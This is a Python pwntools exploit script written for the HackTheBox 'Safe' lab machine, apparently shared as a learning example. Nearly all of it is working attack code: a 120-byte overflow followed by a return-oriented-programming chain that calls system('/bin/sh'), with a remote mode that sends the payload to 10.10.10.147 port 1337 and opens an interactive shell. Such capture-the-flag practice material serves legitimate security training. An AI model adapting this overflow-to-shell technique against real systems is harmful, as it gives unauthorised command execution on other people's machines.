#!/usr/bin/env python3
# -*- coding: UTF-8 -*-

'''
auth: @cyhfvg https://github.com/cyhfvg
date: 2022/06/26

reverse engine.
buffer overflow.

example to show how to create payload and how to exploit with pwntools.

ref:

[hackthebox Safe](https://app.hackthebox.com/machines/Safe)
[Safe - WriteUp](https://www.tagnull.de/post/safe/)
[ippsec Safe writeup video](https://www.youtube.com/watch?v=CO_g3wtC7rk)
'''


from pwn import *

# global var defination {{{1
MODE_L="local"
MODE_R="remote"
MODE_D="debug"
#}}}

# exploit mode {{{1
#exploit_mode=MODE_L
#exploit_mode=MODE_R
exploit_mode=MODE_D
#}}}


def creatPayload() -> str:
    # Stage 0
    junk = ("A" * 120).encode()         # buff
    cmd_bin_sh = "/bin/sh\x00".encode()

    # ROP - Return Oriented Programming
    pop_r13 = p64(0x401206)             # pop r13 r14 r15
    mov_rsp_2_rdi = p64(0x401156)       # mov rdi, rsp

    # RCE
    fake = p64(0x000000)                # dummy value for pop r14 and pop r15
    r13_system = p64(0x401040)          # system address
    r14_fake = fake
    r15_fake = fake
    jmp_r13 = p64(0x401159)

    #p.recvuntil("What do you want me to echo back?")
    payload = junk # buff
    #                      ret: eip/rip     args
    payload = payload +    pop_r13          + r13_system + r14_fake + r15_fake
    #                      ret: eip/rip     args
    payload = payload +    mov_rsp_2_rdi    + cmd_bin_sh
    #                      ret: eip/rip
    payload = payload +    jmp_r13

    return payload

def exploit(payload: str) -> None:
    if exploit_mode == MODE_L:
        # output file
        fileName = "payload.txt"
        f = open(fileName, "wb")
        f.write(payload)
        print(f"exec: (cat ./{fileName}; cat) | ./target")

    else:
        # set target os,arch info
        context(os='linux', arch='amd64')
        context(terminal=['tmux', 'new-window'])

        # debug mode
        if exploit_mode == MODE_D:
            target = "./myapp"
            # wait hint, then sendline
            waitPrompt = "What do you want me to echo back?"

            p = gdb.debug(target, 'b main')

            p.recvuntil(waitPrompt)
            p.sendline(payload)
            p.interactive()

        # remote exploit mode
        elif exploit_mode == MODE_R:
            remoteIp = "10.10.10.147"
            remotePort = 1337
            p = remote(remoteIp, remotePort)
            p.sendline(payload)
            p.interactive()

# ========================================================
# main
#0x40115f - main
#0x40116e - system
#0x401206 - pop r13 r14 r15
#0x401156 - test :  mov rdi, rsp
#0x401159 - test :  jmp r13
exploit(creatPayload())
